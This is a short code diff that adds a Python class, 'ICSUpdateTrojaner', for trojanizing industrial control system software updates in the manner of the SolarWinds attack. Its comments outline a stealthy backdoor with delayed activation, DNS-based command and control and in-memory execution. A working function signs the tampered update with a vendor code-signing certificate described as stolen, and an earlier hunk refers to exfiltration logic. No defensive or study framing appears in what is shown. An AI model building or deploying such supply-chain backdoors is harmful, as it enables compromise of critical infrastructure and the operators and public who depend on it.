@@ -39,3 +39,34 @@ sign_firmware firmware_final.bin
         """
         cert_path = "/opt/plc_build/certs/codesign.pfx"
         # ... exfiltration logic
+
+# Apply SolarWinds technique to ICS software updates
+class ICSUpdateTrojaner:
+    def __init__(self, update_package):
+        self.package = update_package
+
+    def inject_sunburst_style_backdoor(self):
+        """
+        Inject stealthy backdoor into OT software update
+        """
+        # Locate core DLL in update package
+        core_dll = self.extract_dll("OT_Core.dll")
+
+        # Inject backdoor class into .NET assembly
+        # Or patch native DLL with shellcode
+
+        # Characteristics:
+        # - Long sleep before activation (avoid detection)
+        # - DNS-based C2 (stealthy, hard to block)
+        # - Legitimate code signing certificate (stolen from vendor)
+        # - Minimal disk footprint (in-memory execution)
+
+        self.rebuild_update_package()
+
+    def sign_with_stolen_cert(self, file_path, cert_path, password):
+        """
+        Sign trojanized update with vendor's stolen certificate
+        """
+        import subprocess
+        cmd = f'signtool sign /f {cert_path} /p {password} /t http://timestamp.server.com {file_path}'
+        subprocess.call(cmd)
